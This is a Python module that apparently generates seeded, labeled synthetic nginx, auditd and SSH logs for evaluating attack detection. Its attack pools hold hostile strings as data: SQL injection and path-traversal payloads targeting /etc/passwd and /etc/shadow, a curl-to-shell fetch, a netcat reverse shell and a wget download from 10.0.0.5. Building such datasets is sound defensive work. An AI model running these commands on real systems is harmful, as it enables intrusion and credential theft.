"""Synthetic log generation (S1; SPECIFICATION.md §4, FR-S1-1/2).

Programmatic, seeded generation from attack-type templates, for control and
reproducibility. Every record carries ground-truth label, attack type, and
per-field provenance. These records are the *clean* inputs; payloads are added
separately by logsub.data.inject so the un-attacked labeled set stays available
for utility measurement (SPECIFICATION.md §6).
"""

from __future__ import annotations

import random
import uuid

from logsub.data.substrates import get_spec
from logsub.schema import (
    AttackType,
    GroundTruth,
    Label,
    LogRecord,
    Substrate,
)

# --- small content pools ----------------------------------------------------

_BENIGN_UA = [
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "curl/8.5.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15",
]
_BENIGN_PATHS = ["/", "/index.html", "/about", "/api/v1/health", "/static/app.css", "/favicon.ico"]
_BENIGN_USERS = ["alice", "bob", "deploy", "www-data", "carol"]
_SCANNER_UA = ["Nmap Scripting Engine", "sqlmap/1.8", "Nikto/2.5.0", "masscan/1.3", "python-requests/2.31"]

_ATTACK_QUERY = {
    AttackType.SQLI: ["id=1' OR '1'='1", "id=1 UNION SELECT username,password FROM users--",
                      "q=1;DROP TABLE users--"],
    AttackType.COMMAND_INJECTION: ["host=127.0.0.1;cat /etc/passwd", "ip=8.8.8.8|id",
                                   "f=$(curl evil)"],
}
_ATTACK_URI = {
    AttackType.PATH_TRAVERSAL: ["/../../../../etc/passwd", "/files/..%2f..%2f..%2fetc%2fshadow",
                               "/download?file=../../../../etc/hosts"],
    AttackType.SCANNING: ["/wp-login.php", "/.env", "/admin/config.php", "/phpmyadmin/",
                          "/.git/config"],
}
_ATTACK_ARGV = {
    AttackType.COMMAND_INJECTION: ["bash -c 'curl http://10.0.0.5/s|sh'", "nc -e /bin/sh 10.0.0.5 4444",
                                   "wget http://10.0.0.5/x -O /tmp/x"],
    AttackType.PATH_TRAVERSAL: ["cat ../../../../etc/shadow", "tar -xf ../../root/.ssh/authorized_keys"],
}


def _rng(seed: int | None) -> random.Random:
    return random.Random(seed)


def _uid(r: random.Random) -> str:
    """A UUIDv4 drawn from the seeded RNG, so seeded runs reproduce ids too (NFR-1)."""
    return str(uuid.UUID(int=r.getrandbits(128), version=4))


def _ts(r: random.Random) -> str:
    return f"{r.randint(10,28):02d}/Jun/2026:{r.randint(0,23):02d}:{r.randint(0,59):02d}:{r.randint(0,59):02d} +0000"


def _ip(r: random.Random) -> str:
    return ".".join(str(r.randint(1, 254)) for _ in range(4))


# --- per-substrate generators ----------------------------------------------

def _gen_nginx(r: random.Random, malicious: bool) -> LogRecord:
    spec = get_spec(Substrate.NGINX_ACCESS)
    if not malicious:
        attack_type = AttackType.NONE
        uri, query, ua = r.choice(_BENIGN_PATHS), "", r.choice(_BENIGN_UA)
        status, method = r.choice(["200", "200", "304", "404"]), r.choice(["GET", "GET", "POST"])
    else:
        attack_type = r.choice([
            AttackType.SQLI, AttackType.COMMAND_INJECTION,
            AttackType.PATH_TRAVERSAL, AttackType.SCANNING, AttackType.CREDENTIAL_STUFFING,
        ])
        query, ua = "", r.choice(_SCANNER_UA)
        method = "GET"
        if attack_type in _ATTACK_QUERY:
            uri, query = "/search", r.choice(_ATTACK_QUERY[attack_type])
        elif attack_type in _ATTACK_URI:
            uri = r.choice(_ATTACK_URI[attack_type])
        elif attack_type is AttackType.CREDENTIAL_STUFFING:
            uri, method, ua = "/login", "POST", r.choice(_SCANNER_UA)
        else:
            uri = "/"
        status = r.choice(["200", "403", "404", "500"])

    fields = {
        "remote_addr": _ip(r), "time_local": _ts(r), "method": method, "uri": uri,
        "query": query, "protocol": "HTTP/1.1", "status": status,
        "body_bytes": str(r.randint(0, 8000)), "referer": "-", "user_agent": ua,
    }
    return LogRecord(
        id=_uid(r), substrate=Substrate.NGINX_ACCESS, fields=fields, provenance=spec.provenance,
        ground_truth=GroundTruth(
            label=Label.MALICIOUS if malicious else Label.BENIGN, attack_type=attack_type),
    )


def _gen_auditd(r: random.Random, malicious: bool) -> LogRecord:
    spec = get_spec(Substrate.AUDITD_EXECVE)
    if not malicious:
        attack_type = AttackType.NONE
        exe, path, argv = "/usr/bin/ls", "/var/www", "ls -la /var/www"
    else:
        attack_type = r.choice([AttackType.COMMAND_INJECTION, AttackType.PATH_TRAVERSAL])
        argv = r.choice(_ATTACK_ARGV[attack_type])
        exe = "/bin/bash" if attack_type is AttackType.COMMAND_INJECTION else "/usr/bin/cat"
        path = argv.split()[0]
    fields = {
        "timestamp": f"{r.randint(1_700_000_000, 1_800_000_000)}.{r.randint(0,999):03d}:{r.randint(1,9999)}",
        "pid": str(r.randint(1000, 60000)), "uid": str(r.choice([0, 33, 1000])),
        "exe": exe, "path": path, "argv": argv,
    }
    return LogRecord(
        id=_uid(r), substrate=Substrate.AUDITD_EXECVE, fields=fields, provenance=spec.provenance,
        ground_truth=GroundTruth(
            label=Label.MALICIOUS if malicious else Label.BENIGN, attack_type=attack_type),
    )


def _gen_ssh(r: random.Random, malicious: bool) -> LogRecord:
    spec = get_spec(Substrate.SSH_AUTH)
    if not malicious:
        attack_type, user, result = AttackType.NONE, r.choice(_BENIGN_USERS), "Accepted password"
    else:
        attack_type = AttackType.CREDENTIAL_STUFFING
        user = r.choice(["root", "admin", "oracle", "postgres", "test", "ubuntu"])
        result = "Failed password"
    fields = {
        "timestamp": f"Jun {r.randint(10,28):2d} {r.randint(0,23):02d}:{r.randint(0,59):02d}:{r.randint(0,59):02d}",
        "host": "web01", "result": result, "user": user, "src_ip": _ip(r),
        "port": str(r.randint(1024, 65535)), "client_version": "SSH-2.0-OpenSSH_9.6",
    }
    return LogRecord(
        id=_uid(r), substrate=Substrate.SSH_AUTH, fields=fields, provenance=spec.provenance,
        ground_truth=GroundTruth(
            label=Label.MALICIOUS if malicious else Label.BENIGN, attack_type=attack_type),
    )


_GENERATORS = {
    Substrate.NGINX_ACCESS: _gen_nginx,
    Substrate.AUDITD_EXECVE: _gen_auditd,
    Substrate.SSH_AUTH: _gen_ssh,
}


def generate(
    substrate: Substrate,
    n: int,
    *,
    malicious_ratio: float = 0.5,
    seed: int | None = None,
) -> list[LogRecord]:
    """Generate ``n`` clean (un-injected), labeled records for a substrate."""
    r = _rng(seed)
    gen = _GENERATORS[substrate]
    out: list[LogRecord] = []
    for _ in range(n):
        out.append(gen(r, r.random() < malicious_ratio))
    return out
